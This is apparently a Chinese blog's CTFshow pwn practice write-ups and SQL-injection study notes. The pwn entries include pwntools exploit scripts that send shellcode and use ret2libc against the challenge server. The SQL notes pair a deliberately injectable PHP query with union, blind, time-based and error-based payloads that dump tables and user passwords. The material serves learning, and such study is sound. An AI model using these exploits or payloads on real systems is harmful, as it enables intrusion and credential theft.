<p><img src="/2025/01/19/pwn6-12/wps2.jpg" alt="img"></p>
<p>括号[]的意思是将esi所指向的地址的值赋值给eax</p>
<p>Esi, offset dword_80490E8的意思是将msg(massage,这里是指dword_8090E8)的地址赋值给esi</p>
<p>那么值为什么呢？双击！跟进</p>
<p><img src="/2025/01/19/pwn6-12/wps3.jpg" alt="img"></p>
<p>{0x636C6557}</p>
<h3 id="pwn10">pwn10</h3>
<p>题目信息:寄存器相对寻址方式结束后eax寄存器的值为？</p>
<p><img src="/2025/01/19/pwn6-12/wps4.jpg" alt="img"></p>
<p>最终eax=[0x80490E8+4]=[0x80490EC]=ome_to_CTFshow_PWN</p>
<p><img src="/2025/01/19/pwn6-12/wps5.jpg" alt="img"></p>
<h3 id="pwn11">pwn11</h3>
<p>题目信息:基址变址寻址方式结束后的eax寄存器的值为？</p>
<p>基址变址寻址方式结束后的eax寄存器的值为？</p>
<p><img src="/2025/01/19/pwn6-12/wps6.jpg" alt="img"></p>
<p>Eax=[0x80490E8+2*2]=[80490EC]=ome_to_CTFshow_PWN</p>
<h3 id="pwn12">pwn12</h3>
<p>相对基址变址寻址方式结束后eax寄存器的值为？</p>
<p><img src="/2025/01/19/pwn6-12/wps7.jpg" alt="img"></p>
<p>Eax=[0x80490E8+1+8*2-6]=[80490EC]=ome_to_CTFshow_PWN</p>
]]></content>
      <tags>
        <tag>ctfshow_pwn_前置基础</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn20-</title>
    <url>/2025/01/21/pwn20/</url>
    <content><![CDATA[<h1>pwn20、21、22</h1>
<p><a href="https://blog.csdn.net/linyt/article/details/51635768">https://blog.csdn.net/linyt/article/details/51635768</a></p>
<p><a href="https://linyt.blog.csdn.net/article/details/51636753">https://linyt.blog.csdn.net/article/details/51636753</a></p>
<p><a href="https://linyt.blog.csdn.net/article/details/51637832">https://linyt.blog.csdn.net/article/details/51637832</a></p>
<p>.got和.got.plt是否可写</p>
<p>checksec当中的RELRO与此有关，</p>
<p><img src="/2025/01/21/pwn20/wps2.jpg" alt="img"></p>
<table>
<thead>
<tr>
<th>当RELRO为Partial RELRO时，表示.got不可写而.got.plt可写。</th>
</tr>
</thead>
<tbody>
<tr>
<td>当RELRO为FullRELRO时，表示.got不可写.got.plt也不可写。</td>
</tr>
<tr>
<td>当RELRO为No RELRO时，表示.got与.got.plt都可写。</td>
</tr>
</tbody>
</table>
<p>根据checksec得知flag的前半部分</p>
<table>
<thead>
<tr>
<th>20:1 1</th>
</tr>
</thead>
<tbody>
<tr>
<td>21:0 1</td>
</tr>
<tr>
<td>22:0 0</td>
</tr>
</tbody>
</table>
<p>Readelf -S pwn找到flag后半部分</p>
<table>
<thead>
<tr>
<th>20:0x600f18、0x600f28</th>
</tr>
</thead>
<tbody>
<tr>
<td>21:0x600ff0_0x601000</td>
</tr>
<tr>
<td>22:0x600fc0</td>
</tr>
</tbody>
</table>
<p>按题目要求拼接flag即可</p>
<h1>pwn23</h1>
<p>我觉得这道题不应该出现在这里，或者出现在这里就是让大家了解一下栈溢出</p>
<p>连接之后可以直接进行操作，…/ls</p>
<p>发现ctfshow_flag可以直接cat，但是这里不行</p>
<p>file和checksec一下，32，进去ida跟进ctfshow，发现strcpy函数，此函数不会限制大小，但其里面有dest上方限制了大小为58，可以栈溢出(0x3Eh+0x4)</p>
<p>至于为什么栈溢出之后会出现flag：</p>
<p>ida上面还有一段代码  signal(11, (__sighandler_t)sigsegv_handler);</p>
<p><img src="/2025/01/21/pwn20/wps3.jpg" alt="img"></p>
<p>简单来说就是我们利用了栈溢出，这段代码检测出了我们这种非法行为，然后就运行sigsegv_handler这个函数，而这个函数正好可以打印出来flag</p>
<p><img src="/2025/01/21/pwn20/wps4.jpg" alt="img"></p>
<p>这个内容在pwn35当中还会出现</p>
<h1>pwn24</h1>
<p>题目提示：你可以使用pwntools的shellcraft模块来进行攻击</p>
<p>这道题大致应该是让我们认识一下shell和exp</p>
<p>先解释一下shell：相当于我们windows上面的cmd</p>
<p>exp是我们利用程序漏洞，编写出的可以拿到服务端的shell的代码</p>
<p>例如本题拿到shell的exp：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import * //引入pwn库</span><br><span class="line"></span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;, &quot;28155&quot;) //远程连接xxx的xxx端口</span><br><span class="line"></span><br><span class="line">shell = asm(shellcraft.sh()) //创建shellcraft模块进行连接</span><br><span class="line"></span><br><span class="line">p.sendline(shell) //将shell发送给服务端</span><br><span class="line"></span><br><span class="line">p.interactive() //与服务端进行交互（cat flag......）</span><br></pre></td></tr></table></figure>
<p>其他作者的wp里面没有说明为什么写一个shell就可以拿到flag，但有一个作者提到了ret2text题型，之后可以看一下</p>
<p>ctfshow{82d73717-57b0-4b24-a66b-4d916886d6b3}</p>
<h1>pwn25</h1>
<p>ret2libc</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>, <span class="string">&quot;28111&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x88</span> + <span class="number">0x4</span></span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = offset * <span class="string">b&#x27;a&#x27;</span> + p32(puts_plt) + p32(main_addr) + p32(puts_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将输出的puts的地址赋给puts_addr</span></span><br><span class="line">puts_addr = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"><span class="comment"># 中间填充4个a是为了使栈上的数据对齐，直接写 /bin/sh 的地址是可以的，但这样做可能导致栈上的数据错乱，影响函数参数的正确传递。</span></span><br><span class="line">payload = offset * <span class="string">b&#x27;a&#x27;</span> + p32(system_addr) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">4</span> + p32(binsh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>总结的来说，就是利用两次公式和一个可用的函数，payload两次。在后一个payload通过sys和binsh的拼接拿到shell。在前一个payload我们需要通过程序本身来拿到可用的函数puts的真实地址，然后通过此地址计算出sys的地址和binsh字符串的地址。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">公式：</span><br><span class="line">	正着理解：puts的地址=libc当中puts的地址+libc的基地址（puts函数调用就是这样的）</span><br><span class="line">    思想滑坡：libc的基地址=puts的地址-libc当中puts的地址</span><br></pre></td></tr></table></figure>
<h1>pwn26</h1>
<p>什么是ASLR?<br>
大多数的攻击都基于这样一个前提，即攻击者知道程序的内存布局，需要提前知道shellcode或者其他一些数据的位置。因此，引入内存布局的随机化能够有效增加漏洞利用的难度，其中一种技术就是ASLR（Address Space Layout Randomization）。ASLR提供的只是概率上的安全性，根据用于随机化的熵，攻击者有可能幸运地猜到正确的地址，有时攻击者还可以爆破。</p>
<p>在Linux上，ASLR的全局配置/proc/sts/kernel/randomize_va_space有三种情况：0表示关闭ASLR；1表示部分开启（将mmap的基址，stack和vdso页面随机化）；2表示完全开启（在部分开启的基础上增加heap的随机化）。如下：</p>
<p><img src="/2025/01/21/pwn20/dca1d09a503d59cfce1fcec2afad6776.png" alt="在这里插入图片描述"></p>
<p>我们可以修改/proc/sts/kernel/randomize_va_space文件的值来配置ASLR。</p>
<p><img src="/2025/01/21/pwn20/image-20250120195919434.png" alt="image-20250120195919434"></p>
<p>大致意思：查看我们的ASLR，如果内容为0则给出正确的flag，如果不是0，则给出错误的flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">su root</span><br><span class="line">echo <span class="number">0</span> &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">./pwn</span><br></pre></td></tr></table></figure>
<p>ctfshow{0x400687_0x400560_0x6032a0_0x7ffff7fbb6b0}</p>
<h1>pwn27</h1>
<p><img src="/2025/01/21/pwn20/image-20250120200224239.png" alt="image-20250120200224239"></p>
<p>大致意思和pwn26差不多，只是ASLR变成了1或者0都可以</p>
<h1>pwn28</h1>
<p>什么限制都没有，直接给flag了</p>
<h1>pwn29</h1>
<p>他就是让我们知道ASLR的作用(随机地址)，然后flag又直接给我们了</p>
<p>在启用 ASLR（Address Space Layout Randomization）和 PIE（Position Independent Executable）后，系统会随机化内存布局，但是随机化的仅仅是对象的起始地址，而不会随机化对象内部的结构和相对偏移</p>
<h1>pwn30</h1>
<p>方法和pwn25相同，可以拿来练习一下</p>
<p>ctfshow{937ddff1-75d3-40ed-8607-54bfd164b92d}</p>
<h1>pwn31</h1>
<p>各种wp都说对新手不太友好</p>
<p>但是我们要勇于挑战自己</p>
<p>做完了，其实奥，其实，就是pwn25加了一点别的</p>
<p>这里需要补充知识：</p>
<p>打开ASLR的时候需要用绝对地址，而我们在pwn25当中使用的是相对地址</p>
<p>如果ASLR没有打开的时候，使用绝对地址也是可以的</p>
<table>
<thead>
<tr>
<th>绝对地址：表示程序加载到内存后，符号（如函数）在内存中的实际位置。它是在程序执行时才能确定的。</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>相对地址（如 <code>elf.plt['puts']</code>）</strong>：它是静态的，通常在程序编译时确定，表示函数在 ELF 文件中的偏移位置。</td>
</tr>
<tr>
<td>真实地址：ASLR打开之后地址会改变，改变之后的地址就是真实地址</td>
</tr>
<tr>
<td>总的来说：绝对地址就像是在文件当中的地址；相对地址就像是程序运行时在内存当中的地址</td>
</tr>
</tbody>
</table>
<p>写exp的思路：1.泄露puts地址。2.计算libc基地址。3.获取sys和binsh的地址。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>, <span class="number">28151</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">main_real_addr = <span class="built_in">int</span>(p.recv().strip(),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_real_addr))</span><br><span class="line">base_addr = main_real_addr - elf.sym[<span class="string">&#x27;main&#x27;</span>] </span><br><span class="line"><span class="comment"># sym 是 ELF 对象的一个属性，它是一个字典，包含了 ELF 文件中所有符号表项的名称与对应地址。这里是指返回main函数的地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 由于ASLR打开了，所以，这里需要用到绝对地址</span></span><br><span class="line">puts_plt = base_addr + elf.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = base_addr + elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">ctfshow_addr = base_addr +elf.sym[<span class="string">&#x27;ctfshow&#x27;</span>]</span><br><span class="line"><span class="comment"># 0x1fc0是.got的真实地址。这里的作用是将寄存器恢复原状，原因是在此程序当中，后续还需要寄存器ebx,如果不恢复，这个程序将会“崩溃”</span></span><br><span class="line">ebx = base_addr + <span class="number">0x1fc0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#总共需要140个才可以溢出，但是，有大佬说133-136位其实在两题的代码中一直都有特殊意义。为什么是133-136位？你怎么知道是133-136位的？</span></span><br><span class="line">payload = <span class="number">132</span> * <span class="string">b&#x27;a&#x27;</span> + p32(ebx) + <span class="number">4</span> * <span class="string">b&#x27;a&#x27;</span> +p32(puts_plt) + p32(main_real_addr) +p32(puts_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">puts_addr = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line">payload = <span class="number">140</span> * <span class="string">b&#x27;a&#x27;</span> +p32(system_addr) +p32(ctfshow_addr) + p32(binsh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>ctfshow{b53d77c9-84f9-4bf3-87ae-17bbca44b4c7}</p>
<h1>总结</h1>
<p>1.当checksec查看RELRO时</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RELRO为Partial RELRO时，表示.got不可写而.got.plt可写。</span><br><span class="line"></span><br><span class="line">RELRO为FullRELRO时，表示.got不可写.got.plt也不可写。</span><br><span class="line"></span><br><span class="line">RELRO为No RELRO时，表示.got与.got.plt都可写。</span><br></pre></td></tr></table></figure>
<p>2.signal(11, (__sighandler_t)sigsegv_handler);这段代码会检测我们利用栈溢出，一旦溢出，会运行其中的sigsegv_handler函数</p>
<p>3.shell：相当于我们windows上面的cmd</p>
<p>4.exp是我们利用程序漏洞，编写出的可以拿到服务端的shell的代码</p>
<p>熬穿了，睡觉了，知识点明天再补</p>
]]></content>
      <tags>
        <tag>ctfshow_pwn_前置基础</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn13-19</title>
    <url>/2025/01/19/pwn13-19/</url>
    <content><![CDATA[<h1><em><strong>*pwn13*</strong></em></h1>
<p>如何使用GCC？编译运行后即可获得flag</p>
<p>题目说了gcc</p>
<p>gcc -o flag -flag.c</p>
<p>“-o flag” 表示将编译后的输出文件命名为 “flag”，“-flag.c” 表示要编译的源文件是 “flag.c”。这个指令的作用是使用 gcc 编译器将名为 “flag.c” 的源文件编译成可执行文件，并命名为 “flag”。</p>
<p>之后就编译出了一个flag的文件（无后缀），然后./flag就可以运行得到flag</p>
<h1><em><strong>*pwn14*</strong></em></h1>
<p>请你阅读以下源码，给定key为”CTFshow”，编译运行即可获得flag</p>
<p>Ida</p>
<p><img src="/2025/01/19/pwn13-19/image-20250120034253588.png" alt="image-20250120034253588"></p>
<p>代码的大致逻辑就是读取一个名为&quot;key&quot;的文件，然后根据该文件的内容通过一个while循环再嵌套两个for循环</p>
<p>那一个名字为key的文件怎么搞？内容是什么？</p>
<p>Echo CTFshow &gt; key</p>
<p>Gcc -o flag -flag.c</p>
<p>./flag</p>
<p>拿到flag</p>
<h1><em><strong>*pwn15*</strong></em></h1>
<p>编译汇编代码到可执行文件，即可拿到flag</p>
<p>nasm -f elf64 flag.asm</p>
<p>Gcc -o flag -flag.o</p>
<p>./flag</p>
<p>拿到flag</p>
<h1><em><strong>*pwn16*</strong></em></h1>
<p>使用gcc将其编译为可执行文件</p>
<p>Gcc -o flag -flag.s</p>
<p>./flag</p>
<p>·</p>
<h1><em><strong>*pwn17*</strong></em></h1>
<p>有些命令好像有点不一样？</p>
<p>不要一直等，可能那样永远也等不到flag</p>
<p>Nc一下，四个选项</p>
<p><img src="/2025/01/19/pwn13-19/wps2.jpg" alt="img"></p>
<p>3选项似乎能给出flag，但是要等好久，ida看看要等…114514秒，换算一下约等于31.8小时，ps：傻逼。后面还有system，而且在其他选项当中也有system，而在选项2当中有system，并且可以自行输入system的内容，这应该算是一种思路连接吧，最终得到答案。</p>
<p><img src="/2025/01/19/pwn13-19/wps3.jpg" alt="img"></p>
<p>只有选项2可以用了，</p>
<p>read(0, buf, 0xAuLL);读取输入的9个字符串给buf</p>
<p>strcat(dest, buf);把buf赋值给dest</p>
<p>system(dest);以system输出dest(类似拼接)</p>
<p>那么我们要输入什么呢？而且还要是9个字符串!</p>
<p>原理上，只要不限制长度，cat /ctfshow_flag应该能拿到flag</p>
<p>但是有限制长度，</p>
<p>\1. 根据ctfpwn的考题分析，肯定要拿到shell的，所以，我们system里面要用/bin/sh，就可以</p>
<p>\2. 或者找到其他方法，让输入的字符小于等于9个字符串，用cat /ctf*就可以了</p>
<p>ctfshow{47387d02-8a66-493f-a931-5551b99a4786}</p>
<h1><em><strong>*pwn18*</strong></em></h1>
<p>仔细看看源码，或许有惊喜</p>
<p>假作真时真亦假，真作假时假亦真</p>
<p><img src="/2025/01/19/pwn13-19/wps4.jpg" alt="img"></p>
<p><img src="/2025/01/19/pwn13-19/wps5.jpg" alt="img"></p>
<p><img src="/2025/01/19/pwn13-19/wps6.jpg" alt="img"></p>
<p>ida分析，有fake和real函数，分析得：</p>
<p>fake函数是在文本flag is here 后面跟着一个/ctfshow_flag</p>
<p>Real函数是把文本flag is here 更改为/ctfshow_flag(就是文本，不是指令)</p>
<p>&gt;&gt;</p>
<p>&gt;</p>
<p>综上，应该进行fake函数，并且一定不要运行real函数</p>
<p>Ida分析得，输入9就可以了</p>
<p>ctfshow{39868dcb-b2f7-49ac-83dd-24ea77e44393}</p>
<h1><em><strong>*pwn19*</strong></em></h1>
<p>关闭了输出流，一定是最安全的吗？</p>
<p><img src="/2025/01/19/pwn13-19/wps7.jpg" alt="img"></p>
<p>这是ida看到的</p>
<p><img src="/2025/01/19/pwn13-19/wps8.jpg" alt="img"></p>
<p>nc之后发现已经进入了else进程，应该是别人wp里面的子进程了吧</p>
<p>Fclose(_bss_start)关闭了输出流，就是你无法看到回显，就算你输入了，cat ctfshow_flag也是无法看到内容的</p>
<p>在每个代码后面加上&gt;&amp;0 即可看到回显</p>
<p><img src="/2025/01/19/pwn13-19/wps9.jpg" alt="img"></p>
<p>大致意思应该就是把回显结果覆盖到终端后面或者键盘输入的后面</p>
<p>在之后就可以输入cat ctfshow_flag &gt;&amp;0 即可</p>
<p>最后提一点，我们每次nc进去都是在else里面,我们每次输入一个指令之后得重新nc，因为我们每次输入指令之后子进程就会结束并进入if当中。</p>
<p>ctfshow{478f3d3b-002f-461d-afaa-4ba72d92db9b}</p>
<h1>总结</h1>
<p>1.GCC即GNU 编译器套件（GNU Compiler Collection），将高级编程语言编写的代码转换为可执行机器码或其他目标形式的工具集合，支持多种语言。</p>
<p>2.NASM（Netwide Assembler）是一个基于 x86 架构的汇编语言编译器，用于将汇编语言代码转换为可执行文件或目标文件</p>
<p>3.&gt;&gt;追加，&gt;写入(覆盖)</p>
<p>4.关闭输出流，<code>&gt;&amp;0</code>的作用是将标准输出和标准错误输出都重定向到标准输入所对应的位置或设备</p>
<p><code>&amp;</code>在重定向中用于表示文件描述符。常见的文件描述符有<code>0</code>、<code>1</code>、<code>2</code>，其中<code>0</code>代表标准输入（stdin），<code>1</code>代表标准输出（stdout），<code>2</code>代表标准错误输出（stderr）</p>
<ol start="5">
<li></li>
</ol>
]]></content>
      <tags>
        <tag>ctfshow_pwn_前置基础</tag>
      </tags>
  </entry>
  <entry>
    <title>sql注入</title>
    <url>/2025/02/05/sql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p><img src="/2025/02/05/sql%E6%B3%A8%E5%85%A5/D:%5CBlog%5Csource_posts%5Csql%E6%B3%A8%E5%85%A5%5Cimage-20250404140126208.png" alt="image-20250404140126208"></p>
<h1>sql注入</h1>
<p>前置知识：mysql语法。</p>
<h2 id="数字型注入">数字型注入</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$conn = mysqli_content(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;test&quot;);</span><br><span class="line">	$res = mysqli_query($conn,&quot;select title,content from wp_news where id=&quot;.$_GET[&#x27;id&#x27;]);</span><br><span class="line">	$row = mysqli_fetch_arry($res);</span><br><span class="line">	echo &quot;&lt;center&gt;&quot;;</span><br><span class="line">	echo &quot;&lt;h1&gt;&quot;.$row[&#x27;titile&#x27;].&quot;&lt;/h1&gt;&quot;;</span><br><span class="line">	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">	echo &quot;&lt;h2&gt;&quot;.$row[&#x27;content&#x27;].&quot;&lt;/h3&gt;&quot;;</span><br><span class="line">	echo &quot;&lt;/center&gt;&quot;;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;select title,content from wp_news where id=&quot;.$_GET[&#x27;id&#x27;]</span><br></pre></td></tr></table></figure>
<p>特征：$_GET[‘id’]在双引号外，可以直接使用union进行拼接查询语句。</p>
<h2 id="字符型注入">字符型注入</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$res = mysqli_query($conn,&quot;select title,content from wp_news where id=&quot;.$_GET[&#x27;id&#x27;]);</span><br><span class="line">改为</span><br><span class="line">$res = mysqli_query($conn,&quot;select title,content from wp_news where id=&#x27;&quot;.$_GET[&#x27;id&#x27;].&quot;&#x27;&quot;);</span><br></pre></td></tr></table></figure>
<p>如果传入?id=1，原句会变成id=‘1’，所以要用单引号进行闭合，后面加上url编码的&quot;–%20&quot;或&quot;%23&quot;注释后面的语句。</p>
<h2 id="布尔盲注">布尔盲注</h2>
<p><strong>适用情况：只回显正确或者不正确，没有数据返回。</strong></p>
<p>介绍</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and &#x27;f&#x27; = &#x27;a&#x27;</span><br></pre></td></tr></table></figure>
<p>回显不正确的提示。因为我们的后半布尔判断为false</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and &#x27;f&#x27; = &#x27;f&#x27;</span><br></pre></td></tr></table></figure>
<p>回显正确的提示。<br>
也可以用小于或大于号(判断asc大小)。注意不等号在mysql当中的使用方法(一般用不到)。</p>
<p>我们可以使用substr、mid、substring进行数据截取</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">																截取几个字符</span><br><span class="line">																	 ↓</span><br><span class="line">?id=1&#x27; and (select mid((select concat(user,0x7e,pwd) from wp_user),1,1)) = &#x27;a&#x27;</span><br><span class="line">																   ↑		↑</span><br><span class="line">															   截取第几位	是否为字符a</span><br></pre></td></tr></table></figure>
<h2 id="时间盲注-延时注入">时间盲注(延时注入)</h2>
<p><strong>使用情况：页面回显的内容正确与否都完全相同。</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and sleep(2)</span><br></pre></td></tr></table></figure>
<p>其中尽量用and，因为这样可以顺着理解嘛。做题的话套用if</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and if(length(database())&gt;8,sleep(2),0)</span><br><span class="line">?id=1&#x27; and if((ascii(substr(查询语句,1,1)) =1), sleep(5), 0)</span><br></pre></td></tr></table></figure>
<p>当sleep(x)传到mysql当中时，mysql会等待x秒再返回数据，在此过程中页面处于加载状态。</p>
<h2 id="报错注入">报错注入</h2>
<p>updataxml(file_name,xPath,value)常用来修改xml文件的内容。我们报错注入使用的是其中的xPath(有特殊字符或格式不正确时会出现XPATH syntax error报错)。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xPath原本用法：$book-&gt;item-&gt;getname(&#x27;title&#x27;)</span><br><span class="line">								 ↑</span><br><span class="line">								 注意：xPath可以使用函数</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select updatexml(1,concat(&#x27;~&#x27;,database()),1);</span><br><span class="line">						   ↑</span><br><span class="line">						   使用特殊字符使其报错。为什么？否则无xPath报错回显，看不到数据</span><br></pre></td></tr></table></figure>
<p>注意：请区分这里的报错注入和mysql当中的mysql_error错误注入</p>
<h1>多条注入联合</h1>
<p>这里只是一个连接mysql的多条语句，并非一个方法</p>
<h2 id="union注入-联合注入">union注入(联合注入)</h2>
<p>用于合并多个查询语句。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">服务器语句：&quot;select title,content from wp_news where id=&quot;.$_GET[&#x27;id&#x27;])</span><br><span class="line">payload：?id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;wp_news&#x27;</span><br><span class="line">拼接到服务器当中就是：</span><br><span class="line">select title,content from wp_news where id = -1 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;wp_news&#x27;</span><br><span class="line">更明显一点</span><br><span class="line">select title,content from wp_news where id = -1 </span><br><span class="line">union</span><br><span class="line">select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;wp_news&#x27;</span><br></pre></td></tr></table></figure>
<p>注意：我们使用union时，如果前面一个select有返回值，则返回前一个select的内容，所以这里我们找一个不存在的值-1，前面的语句无法执行，但后一个select可以正常执行。</p>
<h2 id="堆叠注入">堆叠注入</h2>
<p>类似于union</p>
<p>例如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from student;select current_user();</span><br></pre></td></tr></table></figure>
<p>用分号执行多条sql语句</p>
<p>mysqli_query()只能执行一条sl语句</p>
<p>mysqli_multi_query()支持多条sql语句</p>
<p>使用堆叠注入要用于mysqli_multi_query()或与其类似的函数，再或者在用foreach循环执行mysqli_query()。</p>
<h1>一</h1>
<p>我们传入?id=1</p>
<p>正常回显</p>
<p>传入?id=1’</p>
<p>不能正常回显</p>
<p>但是后面加上 --+可以正常回显</p>
<p>–是注释的作用</p>
<p><strong>–</strong>：</p>
<ul>
<li>在 SQL 中，<code>--</code> 是单行注释符号，表示从 <code>--</code> 开始到行尾的内容都会被数据库忽略。</li>
</ul>
<p><strong>+</strong></p>
<ul>
<li><code>+</code> 是一个 URL 编码的空格字符。在 HTTP 请求中，空格通常会被编码为 <code>+</code>。</li>
<li>在 SQL 注入中，攻击者可能会将 <code>--</code> 后面的空格替换为 <code>+</code>，以确保注释符号被正确解析。</li>
</ul>
<p>?id=1’order by 3–+</p>
<p>传入之后回显正常，当把3改为4或者更大的数的话就会报错，说明这里的字段数为3</p>
<p>这叫<strong>探测字段数量</strong>，攻击者通常需要知道查询结果返回的字段数量</p>
<p>?id=-1’union select 1,2,3–+</p>
<p><strong>为什么前面的数字是 <code>-1</code>？</strong></p>
<p>在 SQL 注入中，<code>id=-1</code> 的目的是确保原始查询不返回任何结果，从而使攻击者构造的 <code>UNION SELECT</code> 结果能够显示在页面上。那么id可以为任何数字，只要不是正常的数字</p>
<p><strong><code>UNION SELECT</code> 的作用</strong></p>
<p><code>UNION</code> 是 SQL 中的一个操作符，用于将两个或多个 <code>SELECT</code> 语句的结果集合并。将攻击者构造的查询结果合并到原始查询的结果中。</p>
<p>假设原始查询为:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT id, name, email FROM users WHERE id = 1;</span><br></pre></td></tr></table></figure>
<p>攻击者可以通过 <code>UNION SELECT</code> 注入以下 payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT id, name, email FROM users WHERE id = -1 UNION SELECT 1, 2, 3;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>UNION SELECT 1, 2, 3</code>：返回 3 个字段，字段值分别为 <code>1</code>, <code>2</code>, <code>3</code>。</li>
<li>如果页面显示了 <code>1, 2, 3</code>，说明注入成功。</li>
</ul>
<p>?id=-1’union select 1,database(),version()–+</p>
<p>根据前面的回显我们知道我们可以选择替换2和3可以看到回显所以这里用2和3的位置来看当前<strong>数据库名</strong>和<strong>版本号</strong>，这些是mysql当作的函数，需要记忆</p>
<p>?id=-1’union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=‘security’–+</p>
<p><strong>爆表</strong>，information_schema.tables表示该数据库下的tables表，点表示下一级。where后面是条件，group_concat()是将查询到结果连接起来。如果不用group_concat查询到的只有user。该语句的意思是查询information_schema数据库下的tables表里面且table_schema字段内容是security的所有table_name的内容。也就是下面表格user和passwd。</p>
<ul>
<li>
<p><code>group_concat(table_name)</code>：将 <code>table_name</code> 字段的值连接成一个字符串，方便一次性获取所有表名。</p>
</li>
<li>
<p><code>table_schema</code>：<code>information_schema.tables</code> 中的一个字段，表示表所属的数据库名称。</p>
</li>
<li>
<p><code>'security'</code>：指定要查询的数据库名称（这里是 <code>security</code>）。</p>
</li>
</ul>
<p>?id=-1’union select 1,2,group_concat(column_name) from information_schema.columns where table_name=‘users’–+</p>
<p><strong>爆段名</strong>，该语句的意思是查询information_schema数据库下的columns表里面且table_users字段内容是users的所有column_name的内。<strong>注意table_name字段不是只存在于tables表，也是存在columns表中。表示所有字段对应的表名。</strong></p>
<p>?id=-1’ union select 1,2,group_concat(username ,id , password) from users–+</p>
<p>得到该字段对应的内容</p>
